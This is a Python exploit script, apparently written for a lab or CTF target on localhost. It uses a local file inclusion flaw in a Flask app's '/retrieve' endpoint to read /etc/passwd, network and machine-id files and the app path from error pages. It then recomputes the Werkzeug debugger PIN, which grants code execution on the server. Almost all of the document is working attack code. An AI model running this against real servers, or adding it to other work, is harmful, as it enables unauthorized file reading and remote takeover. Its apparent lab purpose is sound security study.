# script written with instructions from https://blog.gregscharf.com/2023/04/09/lfi-to-rce-in-flask-werkzeug-application/

import requests
import hashlib
from itertools import chain

url = "http://localhost:9999"


def get_file(path: str):
    return requests.get(f"{url}/retrieve", params={"image": path}).text


# getting the username of the user starting the flask session, through passwd
passwd = get_file("/etc/passwd")
username = ""
for line in passwd.splitlines():
    if ":x:1000:" in line:
        username_end = line.find(":x:1000:")
        username = line[:username_end]
        break

# getting the path to app.py, which is done through the error message flask gives
error = get_file("")
cite_start = error.find('<cite class="filename">') + \
    len('<cite class="filename">')
cite_end = error.find('</cite>')
app_path = error[cite_start + 1:cite_end - 1]

# getting mac address of the network device, in decimal form
arp = get_file("/proc/net/arp")
device_name = arp.splitlines()[1][-4:]
arp = get_file(f"/sys/class/net/{device_name}/address")
decimal_mac = str(int(''.join(arp.split(':')), 16))

# getting "machine id", which is the concatenated result of the contents of:
# "/etc/machine-id" or "/proc/sys/kernel/random/boot_id", whichever exists, "/etc/machine-id" preferred
# whatever is after the 2 '/' in the first line of "/proc/self/cgroup"
boot_id = get_file(f"/proc/sys/kernel/random/boot_id").strip()
cgroup = get_file(f"/proc/self/cgroup")
cgroup = cgroup.splitlines()[0].strip().rpartition("/")[2]
machine_id = boot_id + cgroup

print("Username:", username)
print("App path:", app_path)
print("MAC Address in decimal:", decimal_mac)
print("Machine ID:", machine_id)

# generating the pin, script from https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html
probably_public_bits = [
    username,
    'flask.app',
    'Flask',
    app_path
]

private_bits = [
    decimal_mac,
    machine_id,
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print("Final PIN:", rv)
